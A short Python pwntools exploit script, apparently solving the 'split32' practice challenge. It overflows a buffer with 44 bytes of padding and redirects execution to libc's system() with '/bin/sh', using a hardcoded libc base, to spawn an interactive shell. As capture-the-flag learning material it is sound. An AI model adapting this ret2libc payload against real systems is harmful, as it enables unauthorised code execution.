from pwn import *

elf = context.binary = ELF("./split32")
p = process()
libc = elf.libc
libc.address = 0xf7d82000

system = p32(libc.sym["system"])
param_bash = p32(next(libc.search(b"/bin/sh")))

junk = 44
payload = b"A" * junk + system + p32(0x0) + param_bash 
p.sendline(payload)
p.interactive()